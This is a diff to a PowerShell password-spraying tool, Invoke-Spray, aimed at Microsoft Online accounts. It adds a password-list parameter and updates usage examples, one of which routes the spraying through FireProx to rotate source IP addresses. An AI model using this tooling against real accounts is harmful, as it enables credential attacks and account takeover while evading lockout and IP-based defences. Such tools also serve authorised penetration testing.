@@ -26,12 +26,12 @@ function Invoke-Spray {
             -----------
             This command will use the provided userlist and attempt to authenticate to each account with a password of Pass@word123!.
         .EXAMPLE
-            C:\PS> Invoke-Sprayer -UserList .\userlist.txt -Passwords P@ssword -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox -OutFile valid-users.txt
+            C:\PS> Invoke-Sprayer -UserList .\userlist.txt -Passwords @('P@ssword', '123456789') -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox -OutFile valid-users.txt
             Description
             -----------
             This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
         .EXAMPLE
-            C:\PS> Invoke-Sprayer -UserList .\userlist.txt -Passwords .\passwords.txt -OutFile valid-users.txt
+            C:\PS> Invoke-Sprayer -UserList .\userlist.txt -PasswordList .\passwordlist.txt -OutFile valid-users.txt
             Description
             -----------
             This command uses the specified password file to spray and writes the output to a file.
@@ -47,10 +47,14 @@ function Invoke-Spray {
 
         [Parameter(Mandatory = $False,
             Position = 2)]
-        [string]$OutFile = "",
+        [string]$PasswordList = "",
 
         [Parameter(Mandatory = $False,
             Position = 3)]
+        [string]$OutFile = "",
+
+        [Parameter(Mandatory = $False,
+            Position = 4)]
         [switch]$Force
     )
 
@@ -62,6 +66,9 @@ function Invoke-Spray {
     $lockoutquestion = 0
     $fullresults = @()
 
+    if ($PasswordList) {
+        $Passwords = Get-Content $PasswordList
+    }
     Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
     Write-Host -ForegroundColor "yellow" "[*] Now spraying Microsoft Online."
     $currenttime = Get-Date
